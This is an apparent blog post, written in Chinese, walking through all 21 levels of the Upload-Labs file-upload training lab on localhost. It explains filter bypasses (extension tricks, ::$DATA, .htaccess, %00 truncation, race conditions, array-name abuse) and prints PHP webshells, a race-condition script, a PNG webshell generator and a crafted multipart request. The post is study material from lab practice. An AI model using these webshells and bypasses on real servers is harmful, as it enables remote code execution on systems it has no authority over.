@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+
+
+<html lang="zh_CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta name="description" content="Limbus的个人博客" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>文件上传训练 |  Limbus&#39; Blog</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/H-Limbus/h-limbus.github.io@latest/favicon.png" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?afbc0b35e48d80d18aee387ad0d30121";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    <link rel="alternate" href="/atom.xml" title="Limbus' Blog" type="application/atom+xml">
+</head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Upload-Labs文件上传训练/Upload-Labs文件上传训练"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  文件上传训练
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/05/15/Upload-Labs%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AE%AD%E7%BB%83/Upload-Labs%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AE%AD%E7%BB%83/" class="article-date">
+  <time datetime="2023-05-15T07:45:36.870Z" itemprop="datePublished">2023-05-15</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a> / <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">4.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">15 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>在做完了sqli-labs 之后，咋们来看看这个上传文件的题。</p>
+<h2 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h2><p>他的界面直接提示着，请选择上传的图片，肯定就会有过滤的，咋们先上传一个<code>.php</code>文件试试水。果然，报错了，说是上传jpg,gif,png 格式的文件，好办，去bp上修改一下，查看源码，这儿是前端验证。如果是前端验证，咋们就把php文件的后缀改为他支持的格式，然后在bp 上再改回来就欧克了。</p>
+<p>上传成功，然后用菜刀连接，直接连接成功。</p>
+<span id="more"></span>
+
+<h2 id="第二关："><a href="#第二关：" class="headerlink" title="第二关："></a>第二关：</h2><p>在这一关咋们看了一下源码，发现这一关是检查文件扩展名Content-type, , 照片的文件扩展名是  image&#x2F;jpeg&#x2F;gif&#x2F;png。php 的文件扩展名是application&#x2F;octet-stream，所以这边就有两种上传方法，第一种是上传图片马，然后在bp上修改文件后缀名，就和上一关一样了，还有一中是直接上传php文件，在bp修改文件扩展名为照片的文件扩展名。用菜刀可以连接。</p>
+<h2 id="第三关："><a href="#第三关：" class="headerlink" title="第三关："></a>第三关：</h2><p>这一关看了源代码，发现过滤挺多的，首先是过滤文件名的空格，然后删除文件名的最后的点，删除空格和删除点这个是为了防止iis7.5的解析漏洞，就是在文件名后面加上点或者空格会被windows解析成正常的，不是iis本身的漏洞。然后匹配到点的后面的字符串，也就是保留文件名。 然后再将文件名转换成小写，这就是防止大小写过滤，再去去除字符串 ::$DATA ,,，这个也是为了防止解析漏洞，因为::$DATA会将后面的内容转换为文字流，这个只能在widows上有，最后再去除一下空格。然后判断这个文件名是不是在黑名单中，如果在，上传不成功，如果不在，将文件重新命名为时间戳文件后上传。</p>
+<p>这边我尝试我几种绕过姿势，发现都是可以，接下来我们一一讲解：</p>
+<ol>
+<li>咋们可以发现把::$DATA过滤了，但是只是过滤了一遍，所以我们可以双写来建立这个字符   修改文件名为  <code>test.php::$::$DATADATA</code>,过滤之后发现可以直接上传</li>
+<li>这边的黑名单是php,asp,aspx,jsp ，所以我们可以写php3,5,7,8 phtml ,pht 这些文件，可以绕过</li>
+<li>还可以在php 后面加上冒号，后面跟什么都行  test.php:jpg 因为window会忽略冒号后面的字符，可以直接上传成功。</li>
+</ol>
+<h2 id="第四关："><a href="#第四关：" class="headerlink" title="第四关："></a>第四关：</h2><p>这一关和上一关有点类似，只是将黑名单扩展了一些，所以在这关里第二种方法就不能用，但是我们看黑名单，发现里面没有过滤<code>.htaccess</code> 这个文件，这个文件可以配置文件解析，</p>
+<p><code>&lt;FilesMatch &quot;info.png&quot;&gt; setHandler application/x-httpd-php &lt;/FilesMatch&gt; # 这个是在有这个.htaccess的文件夹中的所有文件含有 info.png  这个字符的文件当成php文件执行</code></p>
+<p><code>AddType application/x-httpd-php .jpg</code>  # 这个的意思是把所有的.jpg文件当作php来执行</p>
+<p>所以我们要先上传.htaccess文件，再上传其他文件。</p>
+<h2 id="第五关："><a href="#第五关：" class="headerlink" title="第五关："></a>第五关：</h2><p>还有一种方法是上传 .user.ini 的文件，这个文件的利用比.htaccess更广泛一些，因为这个文件在nginx ,  apache, iis中都可以用。在文件中写  auto_pretend_file&#x3D;test.jpg  意思是将test.jpg 这个文件调用到php 文件中，相当于require函数一样。限制条件是必须要是      只要是以fastcgi运行的php都可以用这个方法。</p>
+<h2 id="第六关："><a href="#第六关：" class="headerlink" title="第六关："></a>第六关：</h2><p>这一关查看源代码就发现那个转换为小写的函数没有了，那不就是随便弄嘛，将php 随意大小写 Php ，等等就可以了。</p>
+<h2 id="第七关："><a href="#第七关：" class="headerlink" title="第七关："></a>第七关：</h2><p>这一关查看源代码，发现转换为小写的函数又回来了，但是删除空格的代码又不见了，简单，直接在php和后面加上空格就欧克了。</p>
+<h2 id="第八关："><a href="#第八关：" class="headerlink" title="第八关："></a>第八关：</h2><p>不出所料，又是少了一个函数，是去除末尾的点的函数，所以我们直接在php 后面加上一个点。，轻松绕过。</p>
+<h2 id="第九关："><a href="#第九关：" class="headerlink" title="第九关："></a>第九关：</h2><p>那个删除::$DATA的函数没有了，在php后面加上就行了。</p>
+<h2 id="第十关："><a href="#第十关：" class="headerlink" title="第十关："></a>第十关：</h2><p>这一关过滤的就很全面了，但是嘞，我们可以看到，他对所有的空格啊，点的过滤都是单次过滤，就是过滤一次就可以了，所以我们可以双写绕过，.php.   .     .php. .     .php::$::$DATADATA 等都是可以的。</p>
+<h2 id="第十一关："><a href="#第十一关：" class="headerlink" title="第十一关："></a>第十一关：</h2><p>这一关换了一个函数 ,str_ireplace（）这个函数有三个参数。str_ireplace(word,rep_word,string)意思是把string 中word替换为req_word，就是在过滤后缀名，但是我们可以看到，这只是一次过滤，所以我们可以双写后缀名绕过，例如 .pphphp 这样，把其中一个php去掉之后又组成新的。</p>
+<h2 id="第十二关："><a href="#第十二关：" class="headerlink" title="第十二关："></a>第十二关：</h2><p>这一关我们查看源码的话，发现有几个函数，strrpos（string ,p art）函数，这个函数的作用是在string中找到最后一个part 的位置，substr （）函数就是截取字符串。而且是白名单绕过，所以之前使用的方法这一关不太适用。</p>
+<p>所以我们这一关使用截断来绕过上传，因为这个获得的文件路径是在get处，所以我们可以在get处加上截断符号，%00 ，save_path&#x3D;.&#x2F;upload&#x2F;1.php%00，然后上传一个图片马就可以了，他最后文件上传的路径是  .&#x2F;upload&#x2F;1.php  test.jpg，在php 后面的会被%00截断，不会被执行。</p>
+<h2 id="第十三关："><a href="#第十三关：" class="headerlink" title="第十三关："></a>第十三关：</h2><p>这一关和上一关的代码大致相同，唯一不同的地方就是获得的路径是post提交过来的，所以我们需要在post 处修改，但是要注意的是，在post 处加%00 需要进行url 编码，才可以执行。依旧是上传图片马，然后修改post。</p>
+<h2 id="第十四关："><a href="#第十四关：" class="headerlink" title="第十四关："></a>第十四关：</h2><p>这一关我们看到界面，给了我们三个提示，第一点，图片马中包含有完整的webshell 。这个简单，我们在文件夹中放两个文件，一个是jpg  &#x2F; png   &#x2F;  gif 的文件，另一个是php的文件，里面写上了phpinfo()。然后在这个目录下面打开cmd ，敲入代码 copy &#x2F;b 1.jpg+1.php test.php，得出一个test.php文件，然后上传之后发现文件的格式变了，可以得出是在检测文件头，所以我们的图片马完全可以。然后我们看文件上传漏洞，发现可以使用file提交get参数，然后把参数加入导入到文件中，这里就是文件包含漏洞，file&#x3D;.&#x2F;upload&#x2F;xxxxxxxxx.jpg。会将jpg文件利用php加载。所以我们可以利用图片马运行webshell。</p>
+<h2 id="第十五关："><a href="#第十五关：" class="headerlink" title="第十五关："></a>第十五关：</h2><p>这一关和上一关是一样的，于是我就有点怀疑怎么会这样，返回上一关，发现提示是检查内容的开头2个字符，而这一关是是使用getimagesize()函数判断，这个函数是检查图片信息的，但是我们制作的图片马依旧可以绕过。</p>
+<h2 id="第十六关："><a href="#第十六关：" class="headerlink" title="第十六关："></a>第十六关：</h2><p>这一关的是和之前的一样，只是检测图片的函数不一样，这一关是exif_imagetype()，这个函数是检测图像的第一个字节并检查其签名。但是我们的图片马十分抗打，依旧是完美绕过，可以用菜刀连接。</p>
+<h2 id="第十七关："><a href="#第十七关：" class="headerlink" title="第十七关："></a>第十七关：</h2><p>这一关有一个十分厉害的函数  imagecreatefromipeg or imagecreatefrompng or imagecreatefromgif，这三个函数的作用是将传入的jpeg png gif  重新渲染了一遍，然后再上传，如果是单纯的使用cmd 中的copy 来制作图片马的话，人家直接二次渲染，把你的shell直接给渲染不见了，于是我就网上找了一下解决办法，有一个大神，讲解的十分详细，链接在这<code>https://www.cnblogs.com/forforever/p/13191999.html</code>。这里我们需要用到一个工具，叫做hxd（好兄弟？），可以对图片的二进制值进行修改的一个工具，第一次接触到，然后我们需要一个gif的文件，这里我们可以试一下，直接用cmd的copy ，shell是phpinfo();发现webshell根本没有上传成功，然后使用hxd看看对比一下上传前后的文件，发现有一部分在渲染之后是没有改变的。那我们就可以在没变的这部分中加入shell，然后再上传，发现图片马已经上传成功。</p>
+<p>但是问题来了，如果我们不上传gif ，想上传png ，jpg的图片格式呢，如果你像gif一样去试的话，发现是不行的，上传会报错，这是因为png ,jpg都会验证格式的，对于文件中的数据会计算。这里就不赘述了，详细情况可以看上面的链接。</p>
+<h2 id="第十八关："><a href="#第十八关：" class="headerlink" title="第十八关："></a>第十八关：</h2><p>这一关的提示是审计代码，奈何本人的水平实在是不行，看不出来，于是上网找writeup，原来是条件竞争漏洞，代码中会先将上传的文件上传到服务器，然后再对这个文件进行一系列的验证，但是在windows中（linux不知道哈），你打开了这个文件，如果你去操作它，比如说删除它或者移动它的话就会报错，我们这一关正是利用这一特性，我们不断上传这个文件，他就会不断创建这个临时文件，然后再不断去验证它，然后我们再通过的别的东西去访问它这个临时文件，那么在某一时刻，临时文件还没来得及验证，或者是还没来得及被删除就被访问到了，那就欧克了，这个文件就相当与上传成功了。</p>
+<p>理论成立，实践开始，首先我们在burpsuite中不断发包，也就是不断上传文件。然后在python 中不断去访问它，那么上传的这个文件中要写啥呢？ 最开始我就写了一个一句话木马，<code>&lt;?php eval($_REQUEST[&#39;xxx&#39;]);?&gt;</code> python的脚本是这样的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://localhost:81/upload-labs-master/upload/shell1.php&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">	code = requests.get(url).status_code</span><br><span class="line">    <span class="keyword">if</span> code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;文件上传成功！&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>很简单的一个脚本，但是当我同时运行bp和python时，在那个文件夹里可以看到shell1.php文件出来了，有不见了，而且当python文件执行成功时，文件夹中的文件还是一闪一闪的，考虑的一下，可能是文件重名就被后面的覆盖了，这里我就想了两个办法，确切的来说是一个，另一个是借鉴网上的，借鉴哈，不算抄袭，读书人的事，怎么能算是抄袭呢？咳咳。</p>
+<p>第一个办法，就是让python对这个文件保持访问的状态，这样就不会被覆盖，第二个是修改shell1.php中的代码，改为<code>&lt;?php fputs(fopen(&#39;shell2.php&#39;, &#39;w&#39;), &#39;&lt;?php @eval($_REQUEST[&quot;XXX&quot;]);?&gt;&#39;);?&gt;</code>也就是说当这个文件访问成功时，会创建另一个文件，这个文件就是我们的shell。妙哇！果断使用第二个。</p>
+<h2 id="第十九关："><a href="#第十九关：" class="headerlink" title="第十九关："></a>第十九关：</h2><p>这一关还是要审计代码，但是我实在时功力不够，看不懂，于是去网上搜索了一下， 它的检验流程是先判断文件的后缀名，然后再临时上传文件，检验文件，最后再真的上传文件，方法就和上一关一样了，条件竞争漏洞，然而，在使用条件竞争的时候我却失败了，因为它是先检查文件名的。所以我就直接制作了图片马，但是这里不知道为什么，即使上传正确的，没加马的gif文件，上传之后也是不能访问，文件直接被渲染出错了，所以只好使用png文件，但是png文件的检验比较严格，具体参照第十七关，使用大神的脚本生成一个图片马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>他这个图片马有点不太懂，最后生成的马是<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>，查了一下，原来是要在访问网页的时候给网页后面一个参数，例如  <a target="_blank" rel="noopener" href="http://localhost/upload/index.php?0=assert">http://localhost/upload/index.php?0=assert</a>  或者 0&#x3D;eval ，牛逼，但是当我尝试的时候，这个马却报错了，可能是在get的时候有两个参数的原因。因为我最开始不太理解这个马，所以我直接将马改了一下，变成了常用的马  <code>&lt;?php eval($_POST[1])?&gt;</code>，万幸的是也上传成功了。</p>
+<h2 id="第二十关："><a href="#第二十关：" class="headerlink" title="第二十关："></a>第二十关：</h2><p>这一关是上传的时候名字可以自己命名，当然包括后缀名，但是对后缀名做了检测，限制了很多，所以这里我们可以使用之前学到的截断来绕过，在定义文件名的时候，.php后面加上一个点，或者使用::$DATA，还可以使用&#x2F;.来pass，还可以使用php的大小写来绕过，%00截断绕过，记得<code>%00</code>要编码哦。</p>
+<h2 id="第二十一关："><a href="#第二十一关：" class="headerlink" title="第二十一关："></a>第二十一关：</h2><p>这一关是一道ctf的题，代码不懂的地方我都查资料弄懂了，我也知道漏洞在哪里，但是就是不知道如何利用这个漏洞，只好查看writeup。</p>
+<p>这个代码是这样的，首先怕判断你的MIME值，必须是jpeg,png,gif 这三种，这个好办，我们直接bp抓包就可以，然后判断你的post那里有没有值，也就是说要不要修改名字，如果要修改，而且修改的文件名不是数组的话，就按照修改的来，如果没有数据，就按照原来的文件名来，将得到的文件名用点分隔成数组，然后判断这个数组的最后一个值在不在白名单中，不在的话报错，在的话继续，定位到这个数组的第一个值，也就是文件名字，再加上数组中数组的个数减一的数，相当于最后一个值，也就是后缀名，然后上传。</p>
+<p>有点绕哈，但是漏洞就在这个话中，修改的文件名不是数组的话，重点，如果我们把要修改的文件名变成数组，而且跳过数组的个数减一这个值，那么我们就可以绕过，使用bp修改数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-----------------------------335042777710070242533827549795</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;2.png&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php $_GET[0]($_POST[1]);?&gt;</span><br><span class="line">-----------------------------335042777710070242533827549795</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[0]&quot;</span><br><span class="line"></span><br><span class="line">upload-20.php</span><br><span class="line">-----------------------------335042777710070242533827549795</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[2]&quot;</span><br><span class="line"></span><br><span class="line">jpg</span><br><span class="line">-----------------------------335042777710070242533827549795</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">-----------------------------335042777710070242533827549795--</span><br></pre></td></tr></table></figure>
+
+<p>按照代码流程走一遍，首先MIME的值肯定是没有问题的，在判断修改的文件名这儿发的时候，发现我们提交的是一个数组，也就是说$file &#x3D; Array([0]&#x3D;&gt;upload-20.php  [2]&#x3D;&gt;jpg)是这样的，大家注意哦，这个数组中是没有1对应的值的，然后判断这个数组的最后一个值是不是在白名单中，因为最后一个值是jpg，所以这儿是没有问题的，下一步，重新组合文件名，将数组中的第一个当作文件名字，数组中个数减一个当作后缀名，第一个就是upload-20.php，而数组中有两个数据，减一的话就变成取数组中1的值，那就是空，所以最后文件名就是upload-20.php， 欧克，完美绕过。</p>
+<p>upload-labs靶场的题已经全部完成，也是学到了很多东西，加油，再接再厉！</p>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          Donate
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://h-limbus.github.io/2023/05/15/Upload-Labs%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AE%AD%E7%BB%83/Upload-Labs%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AE%AD%E7%BB%83/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/05/15/XSS-Labs%E7%BB%83%E4%B9%A0/XSS-Labs%E7%BB%83%E4%B9%A0/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            xss-labs漏洞练习
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/05/15/Sqli-Labs%E6%B3%A8%E5%85%A5%E8%AE%AD%E7%BB%83/Sqli-Labs-master%20%E6%B3%A8%E5%85%A5%E8%AE%AD%E7%BB%83%EF%BC%88Page-3%EF%BC%89/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Sqli-labs注入训练（page-3）</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "ypvGgRhcfezE3aedvYAO6oYo-gzGzoHsz",
+    app_key: "K7VGmo5vDtIxdtx0uAelYpSN",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "秀儿请上座~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+  
+    
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023
+        <i class="ri-heart-fill heart_icon"></i> Limbus
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="https://cdn.jsdelivr.net/gh/H-Limbus/h-limbus.github.io@latest/images/logo.png" alt="Limbus&#39; Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/photography">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/2023/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
